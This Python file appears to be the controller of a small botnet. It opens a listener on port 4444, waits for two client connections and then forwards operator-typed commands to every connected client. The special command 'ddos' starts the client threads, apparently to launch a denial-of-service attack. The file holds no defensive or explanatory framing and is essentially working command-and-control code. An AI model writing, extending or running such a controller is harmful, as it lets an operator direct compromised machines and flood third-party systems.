import socket
import os
import threading
from client import ClientThread, bcolors



listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host = '192.168.100.162'
port = 4444
ThreadCount = 0

try:
    listener.bind((host, port))
except socket.error as e:
    print(str(e))


print('Waitiing for a Connection..')
listener.listen(5)

array_clients= []
while True:
    Client, address = listener.accept()
    print(bcolors.WARNING + 'Connected to: ' + address[0] + ':' + str(address[1]))
    ThreadCount += 1
    array_clients.append(ClientThread(address, Client, ThreadCount))

    print('Thread Number: ' + str(ThreadCount))
    if ThreadCount == 2:
        break;




while True:
    print("Please enter command to send to threads ")
    command = input("")
    if command == "":
        continue
    else:
        for thread in array_clients:
            thread.set_comm(command)
            if command == "ddos":
                thread.start()
            else:
                thread.enable_send()
                thread.send_single_commands()
